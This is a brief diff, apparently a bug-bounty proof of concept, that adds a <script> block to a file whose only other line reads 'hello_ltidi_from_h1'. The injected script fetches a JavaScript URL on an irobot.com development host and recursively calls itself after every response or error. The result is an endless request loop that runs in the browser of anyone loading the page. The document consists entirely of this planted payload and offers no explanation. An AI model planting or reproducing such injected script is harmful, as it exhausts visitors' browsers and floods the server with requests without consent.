@@ -1,1 +1,26 @@
 hello_ltidi_from_h1
+<script>
+  const url = 'https://services-dev.irobot.com/ltidipocx1.js'; // Replace with your desired URL
+
+function sendRequest() {
+  fetch(url)
+    .then(response => response.json())
+    .then(data => {
+      // Process the response data
+      console.log(data);
+      
+      // Call the function again to send another request
+      sendRequest();
+    })
+    .catch(error => {
+      // Handle any errors that occur
+      console.error(error);
+      
+      // Call the function again to send another request
+      sendRequest();
+    });
+}
+
+// Start sending requests
+sendRequest();
+</script>
